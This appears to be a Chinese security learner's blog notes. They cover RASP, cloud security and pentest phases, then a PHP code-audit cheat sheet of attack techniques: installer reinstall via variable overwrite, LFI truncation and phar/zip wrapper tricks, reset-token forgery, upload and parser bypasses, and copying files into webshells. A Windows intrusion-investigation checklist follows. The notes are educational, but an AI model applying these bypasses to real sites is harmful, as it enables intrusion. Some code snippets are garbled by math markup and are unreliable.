从历史上看，许多组织采用了应用程序安全测试 （AST） 工具，这些工具会自动扫描应用程序代码以发现代码质量问题和软件漏洞。今天，许多组织正在转向 Runtime 应用程序自我保护 （RASP），该保护程序在生产中运行时实时扫描和监控应用程序代码。</p>
<p>RASP 与 Web 应用程序一起部署。它监控流量和用户行为，如果检测到问题，它可以阻止特定的用户请求并提醒安全人员。RASP 不依赖于特定的攻击签名，并且能够阻止所有类别的攻击。</p>
<p>RASP 的独特元素是，它利用了应用程序源代码的内部知识。它知道应用程序的行为方式，并可以检测利用代码中的弱点（如代码注入和对已知漏洞的漏洞）的攻击。</p>
<p><strong>6.云安全</strong><br>
随着组织进行数字化转型并将任务关键工作量转移到云中，云安全成为网络安全战略的重要组成部分。保护云是一项挑战，因为基于云的系统没有传统的安全周长，并且可以让攻击者访问 IT 环境的几乎所有方面。</p>
<p>组织必须了解自己与其云提供商之间的责任划分，并正确配置云提供商提供的安全功能，特别是虚拟私有云 （VPC） 等网络隔离功能。他们还必须有一个强大的身份和访问管理 （IAM） 解决方案 - 定义用户帐户、角色和访问控制策略的方法。</p>
<p>在部署连接私有云和公共云或多个公共云之间的混合云或多云基础设施时，组织必须确保所有云环境中的安全性一致，并特别注意集成点。</p>
<p><strong>7.警报疲劳</strong><br>
组织从 IT 系统和安全工具收集大量日志和事件。现在，即使在中小型组织中，使用安全信息和事件管理 （SIEM） 来聚合安全数据并为安全团队创建警报也是很常见的。</p>
<p>警报数量之多，加上许多组织长期缺乏安保人员，导致警报疲劳。安全团队在一天的所有时间都会收到数千个警报，因此很难筛选警报并识别真正的安全事件。</p>
<p>这个问题并不新鲜，有几种方法可以减轻警报疲劳。例如，组织实施威胁情报，以识别警报何时与已知攻击者的签名或攻击模式相关联。计算机学习方法（如用户和事件行为分析 （UEBA）有助于识别异常行为，并自动评分以识别更有可能是恶意的事件。</p>
<p>#渗透测试阶段<br>
笔测试过程可分为五个阶段。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740467866.png" alt="" loading="lazy"><br>
1.规划和侦察<br>
第一阶段涉及：</p>
<p>定义测试的范围和目标，包括要处理的系统和要使用的测试方法。<br>
收集情报（例如网络和域名、邮件服务器），以更好地了解目标的工作原理及其潜在漏洞。<br>
2.扫描<br>
下一步是了解目标应用程序将如何响应各种入侵尝试。这通常是使用：</p>
<p>静态分析–检查应用程序的代码，以估计其运行时的行为方式。这些工具可以在单次传递中扫描整个代码。<br>
动态分析–在运行状态下检查应用程序的代码。这是一种更实用的扫描方法，因为它为应用程序的性能提供了实时视图。<br>
3.获取访问<br>
本阶段使用 Web 应用程序攻击，如跨站点脚本、SQL 注射和后门，以发现目标的漏洞。然后，测试人员尝试利用这些漏洞，通常是通过升级权限、窃取数据、拦截流量等来了解它们可能造成的损害。</p>
<p>4.维护访问<br>
这一阶段的目标是看看漏洞是否可以用于在被利用的系统中实现持久存在-足够长的时间让不良行为者获得深入访问。其理念是模仿先进的持续威胁，这些威胁通常在系统中停留数月，以便窃取组织最敏感的数据。</p>
<p>5.分析<br>
渗透测试的结果随后汇编成一份报告，详细说明：</p>
<p>被利用的特定漏洞<br>
已访问的敏感数据<br>
笔测试员在未检测到的情况下在系统中停留的时间<br>
安全人员会分析此信息，以帮助配置企业的 WAF 设置和其他应用安全解决方案，以修补漏洞并防止未来的攻击。</p>
<p><strong>渗透测试方法</strong><br>
外部测试<br>
外部渗透测试针对的是互联网上可见的公司资产，例如 Web 应用程序本身、公司网站以及电子邮件和域名服务器 （DNS）。目标是访问和提取有价值的数据。</p>
<p>内部测试<br>
在内部测试中，能够访问防火墙后面应用程序的测试人员模拟恶意内部人员的攻击。这不一定是模拟流氓员工。常见的起始场景可能是其凭据因网络钓鱼攻击而被盗的员工。</p>
<p>盲测试<br>
在盲目测试中，测试者只给出被攻击企业的名称。这使安全人员能够实时了解实际应用攻击将如何发生。</p>
<p>双盲测试<br>
在双重盲测试中，安全人员事先并不知道模拟攻击。与现实世界一样，在试图突破之前，他们将没有时间加强防御。</p>
<p><strong>有针对性的测试</strong><br>
在这种情况下，测试人员和安全人员协同工作，并相互评估他们的动作。这是一个有价值的培训练习，为安全团队提供来自黑客观点的实时反馈。</p>
<p><strong>渗透测试和 Web 应用程序防火墙</strong><br>
渗透测试和 WAF 是排他性的，但互利的安全措施。</p>
<p>对于多种笔试（盲和双盲测试除外），测试人员可能会使用 WAF 数据（如日志）来定位和利用应用程序的弱点。</p>
<p>反过来，WAF 管理员可以从笔测试数据中受益。测试完成后，可以更新 WAF 配置，以抵御测试中发现的弱点。</p>
<p>最后，笔测试满足了安全审核程序的某些合规性要求，包括PCI DSS和SOC 2。某些标准，如PCI-DSS 6.6，只能通过使用经过认证的WAF来满足。然而，这样做并没有使笔测试有任何少用，因为它的上述好处和能力，以改善WAF配置。</p>
<p>#php代码审计</p>
<p><strong>安装的问题：</strong><br>
1自动删除这个安装的文件：通过生成一个lock文件，来判断程序是否安装过<br>
2根本无验证：安装完成后不会自动删除文件，又不会生成lock判断是否安装过<br>
3安装file：直接用get提交step2那么就直接进入下一步<br>
4变量覆盖导致重装：可以get，port，cookie任意提交一个变量名$insLockfile,给其赋空值，覆盖掉这个变量inslockfile从而让file_exists为false就不会退出<br>
5判断lock后，无exit：判断是否存在lock文件，如果存在lock文件，jiuhuiheader到index.php但<br>
是header后并没有exit，所以不会退出，类似的还有javascript弹个框<br>
6解析漏洞：在安装完成后会将install.php rename为install.php.bak但是由于apache的解析漏洞，如果无法识别最后一个后缀的话，就会向上解析，那么就会又生成php了,然后结合安装时的变量覆盖又成重装了</p>
<p><strong>包含漏洞</strong><br>
LFI：很多都限制了包含的后缀结尾必须为.php,例如include($a.'.php'),需要阶段后面的这.php<br>
1.00截断=gpc off &amp;&amp; php &lt; 5.3.4<br>
2.长文件名截断<br>
3.转换字符集造成的截断--<code>&lt;iconv()截断&gt;</code><br>
4.伪协议：截取字符判断是不是.php,用zip或者phar协议绕过：首先新建一个1.php，里卖弄phpinfo，然后压缩成.zipranhoubazip的名字改成yu.jpg，然后把这个.jpg上传上去然后包含<br>
5.包含日志环境变量</p>
<p>RFI：包含远程文件或者为协议php://input data等<br>
条件allow_url_include on默认off<br>
allow_url_include off 条件下RFI：allow_url_include为on，allow_url_fopen为off 伪协议<img src="https://jinqipiaopiao.github.io//post-images/1626748376060.png" alt="" loading="lazy"><br>
allow_url_include&amp;&amp;allow_url_fopen为off：包含共享文件<img src="https://jinqipiaopiao.github.io//post-images/1626748436559.png" alt="" loading="lazy">，互联网上445端口基本上被过滤<br>
allow_url_fopen默认on</p>
<p><strong>找回密码</strong><br>
验证token：再找回密码的时候生成一个token，然后存储到数据库中，然后把找回密码的地址发到邮件中url中就含有token由用户点开后就能修改密码<br>
延申：yixiecms的密码解密方式很难解，有时拿到了管理的密码破不掉，利用方法：一般找回密码使用的邮箱，首先吧管理的邮箱注入出来，然后再回去找密码，再把数据库的token注入出来，构造以下地址，就能进行重置密码<br>
rand函数生成token：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi>p</mi><mi>w</mi><mi>d</mi><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo>(</mo><mo>)</mo><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">：</mi><mi mathvariant="normal">对</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi>m</mi><mi>d</mi><mn>5</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">某</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">平</mi><mi mathvariant="normal">台</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">（</mi><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mi mathvariant="normal">）</mi><mi>r</mi><mi>a</mi><mi>n</mi><msub><mi>d</mi><mi>m</mi></msub><mi>a</mi><mi>x</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">有</mi><mn>32768</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">范</mi><mi mathvariant="normal">围</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">定</mi><mi>m</mi><mi>i</mi><mi>n</mi><mi mathvariant="normal">和</mi><mi>m</mi><mi>a</mi><mi>x</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">或</mi><mi mathvariant="normal">者</mi><mi mathvariant="normal">考</mi><mi mathvariant="normal">虑</mi><mi mathvariant="normal">哟</mi><mi mathvariant="normal">个</mi><mi>m</mi><msub><mi>t</mi><mi>r</mi></msub><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">替</mi><mi mathvariant="normal">代</mi><mi mathvariant="normal">它</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">resetpwd=md5(rand());：对rand（）函数生成出来的数字进行md5，某些平台下例如（windows）rand_max只有32768，如果需要的范围大于这个数字，那么指定min和max参数就可以生成大于这个数字的数了，或者考虑哟个mt_rand（）来替代它
`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">对</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">台</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">（</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">）</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">有</span><span class="mord">3</span><span class="mord">2</span><span class="mord">7</span><span class="mord">6</span><span class="mord">8</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">定</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">考</span><span class="mord cjk_fallback">虑</span><span class="mord cjk_fallback">哟</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">替</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">它</span><span class="mord">‘</span></span></span></span>encrpststring=md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">this-&gt;time.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord">.</span></span></span></span>verification.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>u</mi><mi>t</mi><mi>h</mi><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">‘</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">auth);`：
`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">‘</span><span class="mord cjk_fallback">：</span><span class="mord">‘</span></span></span></span>timetemp=date(&quot;Y-m-d:i:s&quot;,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo>)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">this-&gt;time);</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span>auth=util::strcode($timetemp,'ENCODE');`<br>
算法的key并没有初始化，如果知道了这个时间，就可以生成加密的字符串</p>
<p><strong>上传</strong><br>
未验证后缀<br>
验证上传后缀被bypass<br>
上传的文件验证了上传后缀但是文件名不重名：阶段yu.php%00.jpg<br>
上传路径可控<br>
解析漏洞：Nginx-yu.jpg/1.php<br>
Apache-yu.php.xxx<br>
验证方法：mime，客户端的js验证，白名单，黑名单<br>
绕过：大小写，文件名没trim在文件名后面加空格：windows下的x.php%81-%99 decode后仍为x.php，Windows下的特性.php::$data</p>
<p><strong>文件操作</strong><br>
任意文件删除 任意文件复制 任意文件重名 任意文件移动 任意文件下载<br>
首先拿到配置文件中的数据库的连接账号和密码-外联<br>
拿到配置文件，拿到加密解密函数的key0生成加密字符串-结合具体的代码利用<br>
文件删除：由于全局的过滤而不能注入时，可以用任意文件删除删掉这个文件，删除安装文件生成的lock文件，重装<br>
文件复制：要复制的文件要复制到的路径-两个都完全可控时直接把自己的图片复制成一个.php马儿，复制的文件可控，而要复制的路径不可控：copy(ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>(</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>)</mo><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">webdb(updir)/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord">/</span></span></span></span>value&quot;.ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>[</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>]</mo><mi mathvariant="normal">/</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">webdb[updir]/(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">[</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">]</span><span class="mord">/</span><span class="mopen">(</span></span></span></span>value).jpg&quot;);,可以把$value控制为保存了qibocms的加密函数的配置文件，复制后成一个.jpg直接打开可以看到ikey<br>
文件下载：下载配置，nadaokey<br>
文件写入<br>
文件包含</p>
<p><strong>加密函数</strong><br>
拿到加密函数的key-加密一些特殊字符然后拿到加密的字符串<br>
加密可逆：若算法导致了知道明文密文，可逆-拿到加密函数的key从而自己生成一个想要的加密字符串<br>
加密可控：要加密的内容是可控的，密文会输出，这个可控的点能引入特殊字符，那么把一些特殊字符代入到这里面，拿到密文再找到一处decode后会进行特殊操作的点进行各种操作<br>
key泄露</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626750266357.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626772693493.png" alt="" loading="lazy"></p>
<p><strong>powershell简单语法</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626774695884.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626774700742.png" alt="" loading="lazy"></p>
<p><strong>PYTHON系统审计</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626776027040.png" alt="" loading="lazy"></p>
<p>** 网络入侵模式图**<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626776731511.png" alt="" loading="lazy"></p>
<p>** 渗透流程**<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626789659521.jpg" alt="" loading="lazy"></p>
<h1 id="2021-07-21">2021-07-21</h1>
<p><strong>xss platform</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626831897017.png" alt="" loading="lazy"></p>
<p><strong>社会工程学</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832591997.jpg" alt="" loading="lazy"></p>
<p><strong>渗透测试流程</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832577202.png" alt="" loading="lazy"></p>
<p><strong>系统端口审计</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832620633.jpg" alt="" loading="lazy"></p>
<p><strong>web服务器入侵防御</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626833337127.jpg" alt="" loading="lazy"></p>
<p><strong>web渗透</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838100969.jpg" alt="" loading="lazy"></p>
<p><strong>web攻击以及防御技术</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838074639.png" alt="" loading="lazy"></p>
<p><strong>XSS汇总</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838113601.png" alt="" loading="lazy"></p>
<p><strong>web安全</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626877496949.png" alt="" loading="lazy"></p>
<p>#2021-07-23<br>
#入侵排查篇</p>
<p><strong>windows入侵排查</strong></p>
<h3 id="0x00-前言">0x00 前言</h3>
<p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<p>常见的应急响应事件分类：</p>
<p>Web 入侵：网页挂马、主页篡改、Webshell</p>
<p>系统入侵：病毒木马、勒索软件、远控后门</p>
<p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p>
<h3 id="0x01-入侵排查思路">0x01 入侵排查思路</h3>
<h4 id="11-检查系统账号安全">1.1 检查系统账号安全</h4>
<p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p>
<ul>
<li>检查方法：据实际情况咨询相关服务器管理员。</li>
</ul>
<p>2、查看服务器是否存在可疑账号、新增账号。</p>
<ul>
<li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</li>
</ul>
<p>3、查看服务器是否存在隐藏账号、克隆账号。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、打开注册表 ，查看管理员对应键值。</p>
<p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001844433.png" alt="" loading="lazy"></p>
<p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p>
</li>
<li>
<p>检查方法：</p>
<p>a、Win+R 打开运行，输入&quot;eventvwr.msc&quot;，回车运行，打开“事件查看器”。</p>
<p>b、导出 Windows 日志 -- 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001885437.png" alt="" loading="lazy"></p>
<h4 id="12-检查异常端口-进程">1.2 检查异常端口、进程</h4>
</li>
</ul>
<p>1、检查端口连接情况，是否有远程连接、可疑连接。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED</p>
<p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 `tasklist  | findstr &quot;PID&quot;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001907736.png" alt="" loading="lazy"></p>
<p>2、进程</p>
</li>
<li>
<p>检查方法：</p>
<p>a、开始 -- 运行 -- 输入 <code>msinfo32</code> 命令，依次点击 &quot;软件环境 -- 正在运行任务&quot; 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p>
<p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p>
<p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p>
<p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p>
<p>没有签名验证信息的进程<br>
没有描述信息的进程<br>
进程的属主<br>
进程的路径是否合法<br>
CPU 或内存资源占用长时间过高的进程</p>
</li>
</ul>
<p>3、小技巧：</p>
<p>​	a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p>
<p>​	b、查看进程对应的 PID：任务管理器 -- 查看 -- 选择列 -- PID 或者 <code>tasklist | findstr &quot;PID&quot;</code></p>
<p>​	c、查看进程对应的程序位置：</p>
<p>​		任务管理器 -- 选择对应进程 -- 右键打开文件位置</p>
<p>​		运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p>
<p>​	d、<code>tasklist /svc</code>   进程 -- PID -- 服务</p>
<p>​	e、查看Windows服务所对应的端口：</p>
<p>​		%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p>
<h4 id="13-检查启动项-计划任务-服务">1.3 检查启动项、计划任务、服务</h4>
<p>1、检查服务器是否有异常的启动项。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>
b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>
c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p>
<p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p>
<p>d、利用安全软件查看启动项、开机时间管理等。</p>
<p>e、组策略，运行 <code>gpedit.msc</code><br>
